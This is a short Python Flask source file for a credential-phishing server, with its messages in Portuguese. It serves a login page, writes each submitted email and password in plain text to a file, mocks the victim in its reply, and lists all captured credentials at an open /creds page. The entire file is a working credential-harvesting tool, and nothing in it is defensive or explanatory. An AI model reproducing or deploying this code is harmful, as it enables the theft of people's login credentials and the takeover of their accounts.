from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('creds.txt', 'a') as f:
        f.write(f'Email: {email}, Senha: {password}\n')
    return 'Login recebido, trouxa!'

@app.route('/creds')
def show_creds():
    with open('creds.txt', 'r') as f:
        return '<pre>' + f.read() + '</pre>'

if __name__ == '__main__':
    app.run(debug=True)
